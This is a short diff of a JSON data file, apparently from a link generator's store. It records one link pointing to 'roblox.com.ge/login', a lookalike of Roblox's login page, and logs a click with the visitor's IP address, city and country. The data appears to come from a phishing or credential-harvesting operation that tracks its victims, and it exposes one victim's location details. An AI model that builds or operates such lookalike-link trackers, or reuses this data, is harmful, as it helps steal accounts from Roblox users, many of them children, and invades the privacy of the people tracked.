@@ -14855,8 +14855,17 @@
     "targetUrl": "https://www.roblox.com.ge/login",
     "createdAt": 1780532512707,
     "status": "active",
-    "useCount": 0,
+    "useCount": 1,
     "createdBy": "generator",
-    "clicks": []
+    "clicks": [
+      {
+        "timestamp": 1780532516031,
+        "ip": "190.161.151.8",
+        "country": "Chile",
+        "city": "Recoleta",
+        "flag": "🇨🇱",
+        "countryCode": "CL"
+      }
+    ]
   }
 ]
